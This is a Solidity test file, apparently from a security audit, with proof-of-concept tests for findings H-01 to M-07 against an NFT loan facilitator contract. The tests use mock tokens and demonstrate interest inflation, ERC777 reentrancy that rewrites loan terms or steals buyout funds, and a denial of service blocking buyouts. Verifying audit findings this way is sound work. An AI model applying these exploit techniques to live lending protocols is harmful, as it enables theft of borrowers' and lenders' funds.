// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.12;

import { DSTest } from "./helpers/test.sol";
import { Vm } from "./helpers/Vm.sol";

import { NFTLoanFacilitator, INFTLoanFacilitator } from "contracts/NFTLoanFacilitator.sol";
import { NFTLoanFacilitatorFactory } from "./helpers/NFTLoanFacilitatorFactory.sol";
import { BorrowTicket } from "contracts/BorrowTicket.sol";
import { LendTicket } from "contracts/LendTicket.sol";
import { CryptoPunks } from "./mocks/CryptoPunks.sol";
import { DAI } from "./mocks/DAI.sol";

import { TokenERC777, AttackerH2, BorrowerH3, AttackerM1, TokenM5 } from "./helpers/HelpersPOC.sol";

contract POCTest is DSTest {
    Vm vm = Vm(HEVM_ADDRESS);

    NFTLoanFacilitator facilitator;
    BorrowTicket borrowTicket;
    LendTicket lendTicket;

    address borrower = address(1);
    address lender = address(2);

    CryptoPunks punks = new CryptoPunks();
    DAI dai = new DAI();

    uint16 interestRate = 15;
    uint128 loanAmount = 100e18;
    uint32 loanDuration = 1000;
    uint256 startTimestamp = 5;
    uint256 punkId;

    function setUp() public {
        NFTLoanFacilitatorFactory factory = new NFTLoanFacilitatorFactory();
        (borrowTicket, lendTicket, facilitator) = factory.newFacilitator(address(this));
        vm.warp(startTimestamp);

        vm.startPrank(borrower);
        punkId = punks.mint();
        punks.approve(address(facilitator), punkId);
        vm.stopPrank();
    }

    // The mainnet or testnet needs to be forked in order for the test to work (for IERC1820Registry)

    // [H-01] Can force borrower to pay huge interest
    function testPOC_H1() public {
        address victim = address(1234);

        // target victim makes loan
        (, uint256 loanIdVictim) = setUpLoanForTest(victim);

        // borrower makes loan
        (, uint256 loanIdBorrower) = setUpLoanForTest(borrower);

        uint128 factorIncreaseInterest = 50;
        uint128 lendAmount = loanAmount * factorIncreaseInterest;

        setUpLender(lender, type(uint128).max);

        vm.startPrank(lender);
        facilitator.lend(loanIdBorrower, interestRate, loanAmount, loanDuration, lender);
        facilitator.lend(loanIdVictim, interestRate, lendAmount, loanDuration, lender);
        vm.stopPrank();

        // to calcualte loan after 1 year
        vm.warp(365 days);

        // check and compare loan of both borrowes
        uint256 interestOwedByBorrower = facilitator.interestOwed(loanIdBorrower);
        uint256 interestOwedByVictim = facilitator.interestOwed(loanIdVictim);

        // interest owed is much higher because the lended amount is much higher
        assertEq(interestOwedByVictim, interestOwedByBorrower * factorIncreaseInterest);
    }

    // [H-02] currentLoanOwner can manipulate loanInfo when any lenders try to buyout
    function testPOC_H2() public {
        // an ERC777 token
        TokenERC777 token = new TokenERC777();

        // borrower creates a loan for ERC777 token
        vm.startPrank(borrower);
        uint256 tokenId = punks.mint();
        punks.approve(address(facilitator), tokenId);
        uint256 loanId = facilitator.createLoan(
            tokenId,
            address(punks),
            interestRate,
            loanAmount,
            address(token),
            loanDuration,
            borrower
        );
        vm.stopPrank();

        // attacker lends to the borrower
        // attacker contract will re-enter the lend() function when someone try to buyout the lender
        AttackerH2 attacker = new AttackerH2(address(facilitator), address(token));
        attacker.lend(loanId, interestRate, loanAmount, loanDuration);

        // a new lender trys to buyout the attacker
        vm.startPrank(lender);
        token.mint(loanAmount * 2, lender);
        token.approve(address(facilitator), 2 ** 256 - 1); // approve for lending
        facilitator.lend(loanId, interestRate - 2, loanAmount, loanDuration, lender);
        vm.stopPrank();

        NFTLoanFacilitator.Loan memory loan = facilitator.loanInfoStruct(loanId);

        // new lender
        assertEq(LendTicket(lendTicket).ownerOf(loanId), lender);
        // the attacker have set the interest rate to 0
        assertEq(loan.perAnumInterestRate, 0);
        // the attacker have set the duration much greater than what the lender intended to
        assertGt(loan.durationSeconds, loanDuration);
    }

    // [H-03] Borrower can be their own lender and steal funds from buyout due to reentrancy
    function testPOC_H3() public {
        // borrower creates a loan
        TokenERC777 token = new TokenERC777();

        // borrower creates a loan for ERC777 token
        vm.startPrank(borrower);
        uint256 tokenId = punks.mint();
        punks.approve(address(facilitator), tokenId);
        uint256 loanId = facilitator.createLoan(
            tokenId,
            address(punks),
            interestRate,
            loanAmount,
            address(token),
            loanDuration,
            borrower
        );
        vm.stopPrank();

        // borrower lends to the loan using a contract
        BorrowerH3 attacker = new BorrowerH3(address(facilitator), address(token));
        attacker.lend(loanId, interestRate, loanAmount, loanDuration);

        vm.warp(365 days);
        // check interest
        uint256 interestAcrued = facilitator.interestOwed(loanId);
        // a new lender want to buyout
        vm.startPrank(lender);
        token.mint(loanAmount * 2, lender);
        token.approve(address(facilitator), 2 ** 256 - 1); // approve for lending
        facilitator.lend(loanId, interestRate - 2, loanAmount, loanDuration, lender);
        vm.stopPrank();

        // borrower receives the deposited_amount + interest in the contract
        assertEq(TokenERC777(token).balanceOf(address(attacker)), interestAcrued + loanAmount);

        // borrower receives the NFT
        assertEq(punks.ownerOf(tokenId), borrower);

        // lender end up receiving the lendTicket but the loan is closed
        assertEq(LendTicket(lendTicket).ownerOf(loanId), lender);
    }

    //[M-01] When an attacker lends to a loan, the attacker can trigger DoS that any lenders can not buyout it
    function testPOC_M1() public {
        // borrower creates a loan
        TokenERC777 token = new TokenERC777();

        // borrower creates a loan for ERC777 token
        vm.startPrank(borrower);
        uint256 tokenId = punks.mint();
        punks.approve(address(facilitator), tokenId);
        uint256 loanId = facilitator.createLoan(
            tokenId,
            address(punks),
            interestRate,
            loanAmount,
            address(token),
            loanDuration,
            borrower
        );
        vm.stopPrank();

        // attacker lends
        AttackerM1 attacker = new AttackerM1(facilitator, token);
        attacker.lend(loanId, interestRate, loanAmount, loanDuration);

        // lender trys to buyout
        vm.startPrank(lender);
        token.mint(loanAmount * 2, lender);
        token.approve(address(facilitator), 2 ** 256 - 1); // approve for lending

        vm.expectRevert();
        facilitator.lend(loanId, interestRate - 2, loanAmount, loanDuration, lender);
        vm.stopPrank();
    }

    //[M-02] Protocol doesn’t handle fee on transfer tokens
    // function testPOC_M2() public {}

    // [M-03] sendCollateralTo is unchecked in closeLoan(), which can cause user’s collateral NFT to be frozen
    // function testPOC_M3() public {}

    event BuyoutLender(
        uint256 indexed id,
        address indexed lender,
        address indexed replacedLoanOwner,
        uint256 interestEarned,
        uint256 replacedAmount
    );

    // [M-04] requiredImprovementRate can not work as expected when previousInterestRate less than 10 due to precision loss
    function testPOC_M4() public {
        // borrower makes loan
        (, uint256 loanId) = setUpLoanForTest(borrower);

        // set up lender
        setUpLender(lender, type(uint128).max);

        // lend with interestRate = 9
        interestRate = 9;
        vm.startPrank(lender);
        facilitator.lend(loanId, interestRate, loanAmount, loanDuration, lender);
        vm.stopPrank();

        address newLender = address(123);
        setUpLender(newLender, type(uint128).max);

        uint256 accumulatedInterest = facilitator.interestOwed(loanId);

        // the terms will be same as that with the previous lender
        // we can verify this from the emitted BuyoutLender event
        vm.expectEmit(true, true, true, true);
        emit BuyoutLender(loanId, newLender, lender, accumulatedInterest, loanAmount);

        // buyout previous lender with interestRate = 9
        vm.startPrank(newLender);
        facilitator.lend(loanId, interestRate, loanAmount, loanDuration, lender);
        vm.stopPrank();
    }

    // [M-05] Borrowers lose funds if they call repayAndCloseLoan instead of closeLoan
    function testPOC_M5() public {
        // this token doesnt revert on transfer to the zero address
        TokenM5 token = new TokenM5();

        // borrower makes loan
        vm.startPrank(borrower);
        uint256 tokenId = punks.mint();
        punks.approve(address(facilitator), tokenId);
        uint256 loanId = facilitator.createLoan(
            tokenId,
            address(punks),
            interestRate,
            loanAmount,
            address(token),
            loanDuration,
            borrower
        );

        // borrower calls repayAndCloseLoan() instead of closeLoan()
        token.mint(type(uint128).max, borrower);
        uint256 borrowerBalanceInit = token.balanceOf(borrower);

        token.approve(address(facilitator), 2 ** 256 - 1); // approve for lending
        facilitator.repayAndCloseLoan(loanId);
        uint256 borrowerBalanceAfter = token.balanceOf(borrower);
        vm.stopPrank();

        // borrower ends up losing tokens equal to the loanAmount - interest(0-block.timestamp)
        assertGt(borrowerBalanceInit - loanAmount, borrowerBalanceAfter);
        assertEq(punks.ownerOf(tokenId), borrower);
    }

    // [M-06] Might not get desired min loan amount if _originationFeeRate changes
    function testPOC_M6() public {
        facilitator.updateOriginationFeeRate(5);

        uint256 fee = (loanAmount * facilitator.originationFeeRate()) / facilitator.SCALAR();
        uint256 expectedLoanAfterFee = loanAmount - fee;

        // borrower makes loan
        (, uint256 loanId) = setUpLoanForTest(borrower);

        // owner updates fee
        facilitator.updateOriginationFeeRate(10);

        // set up lender
        setUpLender(lender, type(uint128).max);

        // lend
        vm.startPrank(lender);
        facilitator.lend(loanId, interestRate, loanAmount, loanDuration, lender);
        vm.stopPrank();

        uint256 borrowerBalance = dai.balanceOf(borrower);
        assertLt(borrowerBalance, expectedLoanAfterFee);
    }

    // [M-07] mintBorrowTicketTo can be a contract with no onERC721Received method,
    // which may cause the BorrowTicket NFT to be frozen and put users’ funds at risk
    // function testPOC_M7() public {

    // }

    function setUpLender(address lenderAddress, uint256 amount) public {
        // create a lender address and give them some approved dai
        vm.startPrank(lenderAddress);
        dai.mint(amount, lenderAddress);
        dai.approve(address(facilitator), 2 ** 256 - 1); // approve for lending
        vm.stopPrank();
    }

    function setUpLoanWithLenderForTest(
        address borrowerAddress,
        address lenderAddress
    ) public returns (uint256 tokenId, uint256 loanId) {
        (tokenId, loanId) = setUpLoanForTest(borrowerAddress);
        setUpLender(lenderAddress, loanAmount);
        vm.startPrank(lenderAddress);
        facilitator.lend(loanId, interestRate, loanAmount, loanDuration, lender);
        vm.stopPrank();
    }

    // returns tokenId of NFT used as collateral for the loan and loanId to be used in other test methods
    function setUpLoanForTest(address borrowerAddress) public returns (uint256 tokenId, uint256 loanId) {
        vm.startPrank(borrowerAddress);
        tokenId = punks.mint();
        punks.approve(address(facilitator), tokenId);
        loanId = facilitator.createLoan(
            tokenId,
            address(punks),
            interestRate,
            loanAmount,
            address(dai),
            loanDuration,
            borrower
        );
        vm.stopPrank();
    }

    function increaseByMinPercent(uint256 old) public view returns (uint256) {
        return old + (old * facilitator.requiredImprovementRate()) / facilitator.SCALAR();
    }

    function decreaseByMinPercent(uint256 old) public view returns (uint256) {
        return old - (old * facilitator.requiredImprovementRate()) / facilitator.SCALAR();
    }

    function calculateTake(uint256 amount) public view returns (uint256) {
        return (amount * facilitator.originationFeeRate()) / facilitator.SCALAR();
    }
}
